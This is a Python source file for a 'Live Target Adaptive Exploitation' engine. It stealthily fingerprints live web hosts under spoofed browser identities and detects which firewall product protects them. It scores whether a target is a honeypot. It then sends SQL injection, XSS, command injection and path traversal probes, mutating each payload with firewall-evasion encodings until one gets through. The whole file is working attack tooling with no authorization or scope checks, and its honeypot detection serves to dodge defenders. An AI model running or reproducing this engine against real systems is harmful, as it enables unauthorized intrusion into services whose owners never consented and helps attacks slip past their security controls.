"""
Live Target Adaptive Exploitation (LTAE) Engine

Real-time target interaction with dynamic evasion, behavioral baselining,
WAF/IPS detection, deception scoring, adaptive evasion, polymorphic payloads.
"""

import asyncio
import aiohttp
import random
import string
import time
import json
import hashlib
import base64
import struct
import socket
import ssl
import urllib.parse
from dataclasses import dataclass, field
from enum import Enum
from typing import Dict, List, Optional, Any, Tuple, Callable
from collections import defaultdict
import logging

logger = logging.getLogger("ltad_engine")


class LiveTargetState(Enum):
    PROBING = "probing"
    FINGERPRINTING = "fingerprinting"
    VULNERABLE = "vulnerable"
    EXPLOITING = "exploiting"
    COMPROMISED = "compromised"
    HARDENED = "hardened"
    DECEIVING = "deceiving"


@dataclass
class LiveTarget:
    host: str
    port: int
    state: LiveTargetState = LiveTargetState.PROBING
    session_id: str = field(default_factory=lambda: hashlib.sha256(str(time.time()).encode()).hexdigest()[:16])
    behavioral_profile: Dict = field(default_factory=dict)
    active_defenses: List[str] = field(default_factory=list)
    response_patterns: List[Dict] = field(default_factory=list)
    timing_baseline: float = 0.0
    waf_detected: bool = False
    ips_detected: bool = False
    deception_score: float = 0.0
    last_interaction: float = field(default_factory=time.time)
    exploit_chain: List[str] = field(default_factory=list)
    waf_fingerprint: Optional[str] = None
    server_header: Optional[str] = None
    tech_stack: List[str] = field(default_factory=list)


class BehavioralAnalyzer:
    """Analyzes target behavior for anomaly detection and fingerprinting."""

    def __init__(self):
        self.baselines: Dict[str, Dict] = {}

    def analyze_response(self, target: LiveTarget, response: Dict) -> Dict:
        """Analyze HTTP response for behavioral patterns."""
        analysis = {
            "anomaly_score": 0.0,
            "waf_indicators": [],
            "deception_indicators": [],
            "timing_anomaly": False,
        }

        # Timing analysis
        if target.timing_baseline > 0:
            response_time = response.get("response_time", 0)
            if response_time > target.timing_baseline * 3:
                analysis["timing_anomaly"] = True
                analysis["anomaly_score"] += 0.3

        # WAF detection via response headers
        headers = response.get("headers", {})
        waf_signatures = {
            "cloudflare": ["cf-ray", "server: cloudflare", "__cfduid"],
            "modsecurity": ["mod_security", "no_xss"],
            "aws_waf": ["awselb", "x-amzn-requestid"],
            "f5": ["f5", "bigip", "ts-"],
            "akamai": ["akamai", "x-akamai"],
            "sucuri": ["sucuri", "x-sucuri"],
            "wordfence": ["wordfence", "wf_log"],
        }

        for waf, sigs in waf_signatures.items():
            for sig in sigs:
                if any(sig.lower() in str(h).lower() for h in headers.values()):
                    analysis["waf_indicators"].append(waf)
                    target.waf_detected = True
                    target.waf_fingerprint = waf
                    analysis["anomaly_score"] += 0.2

        # Server header analysis
        server = headers.get("server", "").lower()
        if server:
            target.server_header = server
            if any(waf in server for waf in ["cloudflare", "f5", "akamai", "sucuri"]):
                analysis["waf_indicators"].append("server_header")

        # Deception detection
        # - Too perfect responses
        # - Consistent timing (honeypots often have artificial delays)
        # - Fake error pages
        if response.get("status_code") == 200:
            content = response.get("body", "")
            if len(content) < 100 and "error" not in content.lower():
                analysis["deception_indicators"].append("minimal_content")
                analysis["anomaly_score"] += 0.15

        # Update target
        target.response_patterns.append({
            "timestamp": time.time(),
            "status": response.get("status_code"),
            "response_time": response.get("response_time"),
            "headers": headers,
            "analysis": analysis,
        })

        # Keep last 100 patterns
        if len(target.response_patterns) > 100:
            target.response_patterns = target.response_patterns[-100:]

        # Update deception score
        target.deception_score = min(1.0, target.deception_score + analysis["anomaly_score"] * 0.1)

        return analysis

    def update_baseline(self, target: LiveTarget):
        """Update behavioral baseline from response patterns."""
        if len(target.response_patterns) < 5:
            return

        times = [p["response_time"] for p in target.response_patterns[-20:] if p["response_time"]]
        if times:
            target.timing_baseline = sum(times) / len(times)

    def get_defense_profile(self, target: LiveTarget) -> Dict:
        """Get current defense profile of target."""
        return {
            "waf_detected": target.waf_detected,
            "waf_fingerprint": target.waf_fingerprint,
            "ips_detected": target.ips_detected,
            "deception_score": target.deception_score,
            "server_header": target.server_header,
            "tech_stack": target.tech_stack,
            "active_defenses": target.active_defenses,
        }


class LiveTargetEngine:
    """Real-time adaptive engine for live targets."""

    def __init__(self, config: Optional[Dict] = None):
        self.config = config or {}
        self.targets: Dict[str, LiveTarget] = {}
        self.session_pool: Dict[str, aiohttp.ClientSession] = {}
        self.analyzer = BehavioralAnalyzer()
        self.stealth_profiles = self._load_stealth_profiles()
        self.evasion_db = self._load_evasion_db()
        self.payload_mutator = PayloadMutator()

    def _load_stealth_profiles(self) -> Dict:
        """Load user-agent and behavior profiles for evasion."""
        return {
            'chrome_win': {
                'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'accept_language': 'en-US,en;q=0.5',
                'accept_encoding': 'gzip, deflate, br',
                'connection': 'keep-alive',
                'upgrade_insecure_requests': '1'
            },
            'firefox_linux': {
                'user_agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'accept_language': 'en-US,en;q=0.5',
                'accept_encoding': 'gzip, deflate, br',
                'connection': 'keep-alive',
                'upgrade_insecure_requests': '1'
            },
            'safari_mac': {
                'user_agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'accept_language': 'en-US;q=0.9',
                'accept_encoding': 'gzip, deflate, br',
                'connection': 'keep-alive'
            },
            'mobile_ios': {
                'user_agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'accept_language': 'en-US;q=0.9',
                'accept_encoding': 'gzip, deflate, br'
            }
        }

    def _load_evasion_db(self) -> Dict:
        """Load WAF/IPS evasion techniques per attack type."""
        return {
            'sqli': [
                lambda p: p.replace("'", "''"),
                lambda p: p.replace("'", "%27"),
                lambda p: p.replace("'", "\\'"),
                lambda p: p.replace("OR", "O/**/R"),
                lambda p: p.replace("UNION", "UNI/**/ON"),
                lambda p: p.replace("SELECT", "SEL/**/ECT"),
                lambda p: base64.b64encode(p.encode()).decode(),
                lambda p: urllib.parse.quote(p),
                lambda p: ''.join(f'%{ord(c):02x}' for c in p),
            ],
            'xss': [
                lambda p: p.replace("<script>", "<scr\\ipt>"),
                lambda p: p.replace("alert", "al\\ert"),
                lambda p: p.replace("javascript:", "java\\script:"),
                lambda p: p.replace("onerror", "on\\error"),
                lambda p: base64.b64encode(p.encode()).decode(),
            ],
            'cmd_injection': [
                lambda p: p.replace(";", "%3B"),
                lambda p: p.replace("|", "%7C"),
                lambda p: p.replace("&&", "%26%26"),
                lambda p: p.replace(" ", "${IFS}"),
                lambda p: p.replace(" ", "$IFS$9"),
                lambda p: p.replace("cat", "c\\at"),
            ],
            'path_traversal': [
                lambda p: p.replace("../", "..%2f"),
                lambda p: p.replace("../", "..%252f"),
                lambda p: p.replace("../", "....//"),
                lambda p: p.replace("/", "\\"),
                lambda p: p.replace("etc/passwd", "etc%2fpasswd"),
            ]
        }

    async def initialize_live_target(self, host: str, port: int) -> LiveTarget:
        """Initialize monitoring of live target."""
        target_id = f"{host}:{port}"

        if target_id in self.targets:
            return self.targets[target_id]

        target = LiveTarget(host=host, port=port)

        # Create session with stealth profile
        profile = random.choice(list(self.stealth_profiles.values()))
        connector = aiohttp.TCPConnector(ssl=False, limit=10)
        timeout = aiohttp.ClientTimeout(total=30)
        session = aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            headers=profile
        )
        self.session_pool[target_id] = session

        # Initial passive reconnaissance
        await self._passive_recon(target)

        # Active fingerprinting with stealth
        await self._stealth_fingerprint(target, session)

        # Behavioral baseline establishment
        await self._establish_baseline(target, session)

        # Deception detection
        target.deception_score = await self._calculate_deception_score(target)

        self.targets[target_id] = target
        return target

    async def _passive_recon(self, target: LiveTarget):
        """Passive reconnaissance without direct interaction."""
        try:
            # DNS and WHOIS information
            try:
                target.behavioral_profile['hostname'] = socket.gethostbyaddr(target.host)[0]
            except Exception:
                target.behavioral_profile['hostname'] = target.host

            # TLS certificate analysis if applicable
            if target.port in [443, 8443, 9443]:
                await self._analyze_tls_certificate(target)

        except Exception as e:
            logger.debug(f"Passive recon error: {e}")

    async def _analyze_tls_certificate(self, target: LiveTarget):
        """Analyze TLS certificate for target intelligence."""
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            with socket.create_connection((target.host, target.port), timeout=5) as sock:
                with context.wrap_socket(sock, server_hostname=target.host) as ssock:
                    cert = ssock.getpeercert()

                    target.behavioral_profile['tls'] = {
                        'version': ssock.version(),
                        'cipher': ssock.cipher()[0] if ssock.cipher() else None,
                        'issuer': dict(x[0] for x in cert.get('issuer', [])),
                        'subject': dict(x[0] for x in cert.get('subject', [])),
                        'expiry': cert.get('notAfter'),
                        'san_count': len(cert.get('subjectAltName', [])),
                    }
        except Exception as e:
            target.behavioral_profile['tls_error'] = str(e)

    async def _stealth_fingerprint(self, target: LiveTarget, session: aiohttp.ClientSession):
        """Active fingerprinting with stealth."""
        # Multiple requests with different profiles to build baseline
        urls = [
            f"http://{target.host}:{target.port}/",
            f"http://{target.host}:{target.port}/robots.txt",
            f"http://{target.host}:{target.port}/favicon.ico",
        ]

        for url in urls:
            try:
                start = time.time()
                async with session.get(url, allow_redirects=False) as resp:
                    response_time = time.time() - start
                    body = await resp.text()

                    response = {
                        "status_code": resp.status,
                        "headers": dict(resp.headers),
                        "body": body[:5000],
                        "response_time": response_time,
                    }

                    # Analyze for WAF/defenses
                    self.analyzer.analyze_response(target, response)

                    # Extract tech stack
                    self._extract_tech_stack(target, response)

            except Exception as e:
                logger.debug(f"Fingerprint error for {url}: {e}")

    def _extract_tech_stack(self, target: LiveTarget, response: Dict):
        """Extract technology stack from response."""
        headers = response.get("headers", {})
        body = response.get("body", "").lower()

        # Server header
        server = headers.get("server", "").lower()
        if server:
            target.tech_stack.append(f"server:{server}")

        # X-Powered-By
        powered = headers.get("x-powered-by", "").lower()
        if powered:
            target.tech_stack.append(f"powered:{powered}")

        # Body signatures
        signatures = {
            "php": ["php", "x-powered-by: php"],
            "asp.net": ["asp.net", "__viewstate", "aspnet"],
            "node": ["express", "x-powered-by: express"],
            "django": ["csrfmiddlewaretoken", "django"],
            "flask": ["flask", "werkzeug"],
            "spring": ["spring", "jsessionid"],
            "tomcat": ["tomcat", "apache-coyote"],
            "nginx": ["nginx"],
            "apache": ["apache"],
            "iis": ["iis", "microsoft-iis"],
            "wordpress": ["wp-content", "wordpress"],
            "drupal": ["drupal", "drupal.settings"],
            "joomla": ["joomla", "option=com_"],
        }

        for tech, sigs in signatures.items():
            if any(sig in str(headers).lower() or sig in body for sig in sigs):
                if tech not in target.tech_stack:
                    target.tech_stack.append(tech)

    async def _establish_baseline(self, target: LiveTarget, session: aiohttp.ClientSession):
        """Establish behavioral baseline with benign requests."""
        # Send several benign requests to establish timing baseline
        for i in range(5):
            try:
                start = time.time()
                async with session.get(f"http://{target.host}:{target.port}/", allow_redirects=False) as resp:
                    response_time = time.time() - start
                    response = {
                        "status_code": resp.status,
                        "headers": dict(resp.headers),
                        "body": "",
                        "response_time": response_time,
                    }
                    self.analyzer.analyze_response(target, response)
                await asyncio.sleep(random.uniform(0.5, 1.5))
            except Exception:
                pass

        self.analyzer.update_baseline(target)

    async def _calculate_deception_score(self, target: LiveTarget) -> float:
        """Calculate probability target is a honeypot/deception."""
        score = 0.0

        # Low interaction honeypot indicators
        if len(target.tech_stack) == 0:
            score += 0.2

        # Too consistent timing
        if len(target.response_patterns) > 3:
            times = [p["response_time"] for p in target.response_patterns if p["response_time"]]
            if times and max(times) - min(times) < 0.01:
                score += 0.3

        # No WAF but suspicious responses
        if not target.waf_detected and target.deception_score > 0.5:
            score += 0.2

        # Default pages only
        has_real_content = any(
            len(p.get("body", "")) > 500
            for p in target.response_patterns
        )
        if not has_real_content:
            score += 0.2

        return min(1.0, score)

    async def adaptive_probe(
        self,
        target: LiveTarget,
        probe_type: str,
        payload: str,
        max_evasion_rounds: int = 3
    ) -> Dict[str, Any]:
        """
        Adaptive probe with evasion.

        1. Send baseline probe
        2. Analyze response for WAF/IPS
        3. If blocked, apply evasion and retry
        4. Track evasion effectiveness
        """
        session = self.session_pool.get(f"{target.host}:{target.port}")
        if not session:
            return {"error": "No session for target"}

        evasion_used = []
        current_payload = payload

        for round_num in range(max_evasion_rounds + 1):
            # Apply evasion if not first round
            if round_num > 0 and probe_type in self.evasion_db:
                evasion_func = random.choice(self.evasion_db[probe_type])
                current_payload = evasion_func(current_payload)
                evasion_used.append(evasion_func.__name__ if hasattr(evasion_func, '__name__') else f"evasion_{round_num}")

            # Send probe
            try:
                start = time.time()
                if probe_type == "sqli":
                    url = f"http://{target.host}:{target.port}/?id={urllib.parse.quote(current_payload)}"
                elif probe_type == "xss":
                    url = f"http://{target.host}:{target.port}/?q={urllib.parse.quote(current_payload)}"
                elif probe_type == "cmd_injection":
                    url = f"http://{target.host}:{target.port}/?cmd={urllib.parse.quote(current_payload)}"
                elif probe_type == "path_traversal":
                    url = f"http://{target.host}:{target.port}/?file={urllib.parse.quote(current_payload)}"
                else:
                    url = f"http://{target.host}:{target.port}/?{urllib.parse.quote(current_payload)}"

                async with session.get(url, allow_redirects=False) as resp:
                    response_time = time.time() - start
                    body = await resp.text()

                    response = {
                        "status_code": resp.status,
                        "headers": dict(resp.headers),
                        "body": body[:5000],
                        "response_time": response_time,
                        "probe_type": probe_type,
                        "payload": current_payload,
                        "round": round_num,
                    }

                    # Analyze response
                    analysis = self.analyzer.analyze_response(target, response)

                    # Check for successful exploitation
                    if self._check_exploit_success(probe_type, response):
                        target.state = LiveTargetState.VULNERABLE
                        target.exploit_chain.append(f"{probe_type}_round_{round_num}")
                        return {
                            "status": resp.status,
                            "response_time": response_time,
                            "vulnerable": True,
                            "probe_type": probe_type,
                            "evasion_used": evasion_used,
                            "payload": current_payload,
                            "evidence": body[:1000],
                        }

                    # Check for WAF block
                    if resp.status in (403, 406, 429, 500, 501, 502, 503):
                        target.active_defenses.append(f"WAF_block_{probe_type}")
                        if round_num < max_evasion_rounds:
                            continue  # Try evasion
                        else:
                            return {
                                "status": resp.status,
                                "response_time": response_time,
                                "vulnerable": False,
                                "blocked": True,
                                "probe_type": probe_type,
                                "evasion_used": evasion_used,
                                "rounds_attempted": round_num + 1,
                            }

                    # Update baseline
                    self.analyzer.update_baseline(target)

            except Exception as e:
                return {"error": str(e), "probe_type": probe_type, "round": round_num}

        return {
            "status": 0,
            "response_time": 0,
            "vulnerable": False,
            "probe_type": probe_type,
            "evasion_used": evasion_used,
            "rounds_attempted": max_evasion_rounds + 1,
        }

    def _check_exploit_success(self, probe_type: str, response: Dict) -> bool:
        """Check if probe indicates successful exploitation."""
        body = response.get("body", "").lower()
        status = response.get("status_code", 0)

        if probe_type == "sqli":
            indicators = ["sql syntax", "mysql", "syntax error", "unterminated", "odbc", "ora-", "postgresql", "sqlite"]
            return any(ind in body for ind in indicators) or status == 500

        if probe_type == "xss":
            return "<script>alert" in body or "onerror=" in body

        if probe_type == "cmd_injection":
            indicators = ["uid=", "gid=", "root:", "www-data", "bin/bash", "command not found"]
            return any(ind in body for ind in indicators)

        if probe_type == "path_traversal":
            indicators = ["root:", "daemon:", "bin:", "/etc/passwd", "[boot loader]"]
            return any(ind in body for ind in indicators)

        return False

    async def run_exploit_chain(self, target: LiveTarget, chain: List[Dict]) -> List[Dict]:
        """Run a chain of exploits adaptively."""
        results = []
        for step in chain:
            probe_type = step.get("type", "sqli")
            payload = step.get("payload", "test")
            result = await self.adaptive_probe(target, probe_type, payload)
            results.append(result)

            # If step fails, adapt chain
            if not result.get("vulnerable") and result.get("blocked"):
                # Try alternative payload
                alt_payload = self.payload_mutator.mutate(payload, probe_type)
                if alt_payload:
                    result = await self.adaptive_probe(target, probe_type, alt_payload)
                    results.append(result)

        return results

    def get_target_status(self, target: LiveTarget) -> Dict:
        """Get comprehensive target status."""
        return {
            "host": target.host,
            "port": target.port,
            "state": target.state.value,
            "session_id": target.session_id,
            "deception_score": target.deception_score,
            "waf_detected": target.waf_detected,
            "waf_fingerprint": target.waf_fingerprint,
            "ips_detected": target.ips_detected,
            "tech_stack": target.tech_stack,
            "active_defenses": target.active_defenses,
            "exploit_chain": target.exploit_chain,
            "timing_baseline": target.timing_baseline,
            "defense_profile": self.analyzer.get_defense_profile(target),
        }

    async def close(self):
        """Close all sessions."""
        for session in self.session_pool.values():
            await session.close()
        self.session_pool.clear()


class PayloadMutator:
    """Mutate payloads for WAF evasion."""

    def __init__(self):
        self.mutations = {
            'case': lambda p: ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in p),
            'comment': lambda p: p.replace(" ", "/**/"),
            'encoding': lambda p: urllib.parse.quote(p),
            'double_encoding': lambda p: urllib.parse.quote(urllib.parse.quote(p)),
            'whitespace': lambda p: p.replace(" ", random.choice(["\t", "\n", "\r", "%09", "%0A", "%0D"])),
            'unicode': lambda p: ''.join(f"\\u{ord(c):04x}" if random.random() > 0.7 else c for c in p),
            'param_pollution': lambda p: p + "&" + p,
        }

    def mutate(self, payload: str, attack_type: str) -> Optional[str]:
        """Apply random mutation to payload."""
        if not payload:
            return None

        # Apply 1-3 random mutations
        num_mutations = random.randint(1, 3)
        mutated = payload

        for _ in range(num_mutations):
            mutation = random.choice(list(self.mutations.values()))
            try:
                mutated = mutation(mutated)
            except Exception:
                pass

        return mutated if mutated != payload else None